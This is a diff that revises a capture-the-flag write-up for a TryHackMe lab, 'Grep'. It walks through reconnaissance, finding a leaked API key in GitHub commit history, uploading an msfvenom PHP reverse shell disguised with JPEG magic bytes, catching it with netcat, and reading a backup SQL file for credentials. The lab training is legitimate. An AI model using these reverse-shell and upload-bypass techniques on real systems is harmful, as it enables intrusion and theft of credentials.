@@ -15,6 +15,7 @@ disablewordcount: false
 editPost:
     disabled: false
 ---
+Link to challenge: [Grep](https://tryhackme.com/room/greprtp)
 
 ## The task
 
@@ -22,17 +23,13 @@ editPost:
 
 ## Q1: What is the API key that allows a user to register on the website?
 
-Navigating over to the website which in my case is `http://10.10.2.144/` gives us the "Apache2 Ubuntu Default Page". Ok, so now we know they're running Apache.
+Navigating over to the website which in my case is `http://10.10.2.144/` gives us the "Apache2 Ubuntu Default Page". Cool, at least we know they're running Apache.
 
-IMG HERE
-
-Next, let's run an Nmap scan and see what we get.
+Next, let's run an ***nmap*** scan and see what we get.
 
 Commands:
 ```bash
 export ip=10.10.2.144
-```
-```bash
 nmap -A -oN nmap-$ip.out -p- $ip
 ```
 
@@ -71,47 +68,51 @@ Nmap done: 1 IP address (1 host up) scanned in 64.43 seconds
 
 A few things to take note of:
 
-- SSH running
-- Version of Apache: 2.4.41
-- There's are Apache servers running on ports 80, 443 and 51337
+- SSH is running in case we find login credentials
+- Version of Apache is **2.4.41**
+- There's are Apache servers running on ports **80**, **443** and **51337**
 
 Let's go have a look at what exactly is being served over on ports 443 and 51337.
 
-Port 443: we get a "Forbidden" message.
+- Port 443: we get a "Forbidden" message.
+- Port 51337: same thing.
 
-Port 51337: same thing.
+Ok, next let's have a look at the self signed SSL certificates for the sites running on these ports. On port 443, we get a certificate for "grep.thm" and on port 51337 we get "leakchecker.grep.thm".
 
-Ok, next let's have a look at the self signed SSL certificates for the sites running on these ports.
-
-On port 443, we get a certificate for "grep.thm" and on port 51337 we get "leakchecker.grep.thm". Navigating to these domains at the moment gives us a "Server Not Found" error but we might be able to fix that by adding these domains to our `/etc/hosts` file like so:
-```plaintext
-10.10.2.144     grep.thm leakchecker.grep.thm
-```
 Screenshots of the certificates:
 
-IMG HERE
+![06](/pics/ctf-thm-grep/06.webp)
 
-IMG HERE 
+![07](/pics/ctf-thm-grep/07.webp)
+
+Navigating to these domains at the moment gives us a "Server Not Found" error but we can fix that by adding these domains to our `/etc/hosts` file like so:
+```plaintext
+# /etc/hosts
+
+10.10.2.144     grep.thm leakchecker.grep.thm
+```
 
 BINGO! Accept the risk and we're in! Well, sort of anyway.
 
 grep.thm (port 443):
 
-IMG HERE
+![03](/pics/ctf-thm-grep/03.webp)
 
 leakchecker.grep.thm (port 51337):
 
-IMG HERE
+![02](/pics/ctf-thm-grep/02.webp)
 
 The question wants us to give the API key which allows a user to sign up. Let's navigate over to `grep.thm/public/html/register.php` and have a look.
 
 Trying to sign up gives this error:
 
-IMG HERE
+![04](/pics/ctf-thm-grep/04.webp)
 
-Looking at the source code, there's a file called `register.js` which has an API key. This key is obviously wrong, so we need to find the correct one. Now, in the image below, you can see the `register.js` file sends this data to `../../api/register.php`. I'm interested in the `api`.
+Looking at the source code, there's a file called `register.js` which has an API key. This key is obviously not the API key we're looking for, so we need to find the correct one. Now, in the image below, you can see the `register.js` file sends this data to `../../api/register.php`. I'm interested in the `api`.
 
-Navigating to it gives just a blank page. Let's fire up `ffuf` and see what we get!
+![05](/pics/ctf-thm-grep/05.webp)
+
+Navigating to it gives just a blank page. Let's fire up ***ffuf*** and see what we get!
 
 Command:
 ```bash
@@ -190,7 +191,7 @@ The SSL certificate for `grep.thm` had "SearchMe" as the organization.
 
 On Github, searching for "serachme" will give us a bunch of results. We can narrow the results down by selecting a language we want to filter by. In this case, the language we most likely want to filter by is PHP. Doing so yields these results:
 
-IMG HERE
+![08](/pics/ctf-thm-grep/08.webp)
 
 What are we looking for? Let's recap:
 - The app that SuperSecure Corp is building is a blogging platform
@@ -198,11 +199,13 @@ What are we looking for? Let's recap:
 
 Out of the results, this one sticks out to me:
 
-IMG HERE
+![09](/pics/ctf-thm-grep/09.webp)
 
 Let's dig through it to see if we can find anything interesting.
 
-This one contains the same header name as we saw in that `javascript` file before: `X-THM-API-KEY`. Now let's look at the commits if we can find the actual key!
+The file `searchmecms/api/register.php` contains the same header name as we saw in that `javascript` file before: `X-THM-API-KEY`. Now let's look at the commits if we can find the actual key!
+
+![10](/pics/ctf-thm-grep/10.webp)
 
 There it is, in commit `db11421`.
 
@@ -214,13 +217,13 @@ Now that we have the API key, we can go ahead and create a user.
 
 I'll be using Burp Suite for this. First, capture the POST request from `https://grep.thm/public/html/register.php`, then editing `X-Thm-Api-Key` value to match what we found earlier.
 
-IMG HERE
+![11](/pics/ctf-thm-grep/11.webp)
 
-Aaaand success!
+Aaand success!
 
-IMG HERE
+![12](/pics/ctf-thm-grep/12.webp)
 
-Loggin in gives us the first flag!
+Loggin in gives us the first flag!🚩
 
 ### A: *THM{4ec\*\*\*}*
 
@@ -278,18 +281,18 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 ?>
 ```
 
-At first glance it seems like the code is checking both the file extension AND the magic bytes, but it does, in fact, only check to see if the magic bytes are allowed. This means we should be able to send in a `.php` file with modified magic bytes.
+At first glance it seems like the code is checking both the file extension AND the magic bytes. However, it does, in fact only check to see if the magic bytes of the file being uploaded are allowed. `$allowedExtensions` is defined but never used! This means we should be able to upload the file with a `.php` extension, only modifying the magic bytes.
 
-Let's creaft our `PHP` reverse shell using `msfvenom` with the following command:
+1. Creaft the reverse shell using ***msfvenom*** with the following command:
 ```bash
-msfvenom -p php/reverse_php LHOST=10.18.5.200 LPORT=4444 -o revshell.php
+msfvenom -p php/reverse_php LHOST=<YOUR IP HERE> LPORT=4444 -o revshell.php
 ```
+2. Add 4 A's (or any character really) to the beginning of the file
+3. Edit the file with ***hexeditor*** and change the values of the 4 first hexadecimal values to *"FF D8 FF E0"* (or to any other of the allowed values)
 
-Then add 4 A's (or any character really) to the beginning of the file, afterwhich edit the file with `hexeditor` and change the values of the 4 first hexadecimal values to `FF D8 FF E0` (or to any other of the allowed values).
+Now let's try our new file on the upload page (which we also discovered in our ***ffuf*** scan and can be accessed at `https://grep.thm/public/html/upload.php`) and see what happens!
 
-Now let's try our new file on the upload page and see what happens!
-
-And sure enough we get a beautiful `{"message":"File uploaded successfully."}` message in our browser. Now we just need to navigate over to `https://grep.thm/api/uploads/` which we found earlier in the `ffuf` scan and activate the file from there.
+And sure enough we get a beautiful `{"message":"File uploaded successfully."}` message in our browser. Now we just need to navigate over to `https://grep.thm/api/uploads/` which we found earlier in the ***ffuf*** scan and activate the file from there.
 
 Listener:
 ```bash
@@ -298,26 +301,22 @@ nc -lvnp 4444
 
 Before doing anything else, let's stabilise this netcat shell.
 
-Once you have the shell, first run:
+Once you have the reverse shell, do the following:
+1. Run:
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
-Then:
+2. Then:
 ```bash
 eport TERM=xterm
 ```
-Then background the netcat shell by hitting `ctrl+Z`.
-
-Then:
+3. Then background the netcat shell by hitting **CTRL+Z**.
+4. Then turn off your own terminal echo and foreground the netcat shell:
 ```bash
-stty raw -echo
+stty raw -echo; fg
 ```
 
-And finally foreground the netcat shell again with `fg`.
-
-NOTE CANNOT GET SHELL STABILISATION TO WORK
-
-And there is our stabilised shell. Now let's find that admin email!
+Now let's find that admin email!
 
 Looking through the contents of the `/var/www` directory, there sure are many interesting files we cannot access as `www-data`, but one that we can access is `/var/www/backup/users.sql`.
 
@@ -338,7 +337,7 @@ Now, we could go ahead and try to brute force the password hash found in the `us
 
 Going with option two sure enough gives us the password:
 
-IMG HERE
+![13](/pics/ctf-thm-grep/13.webp)
 
 ### A: *admin_\*\*\*!*
 
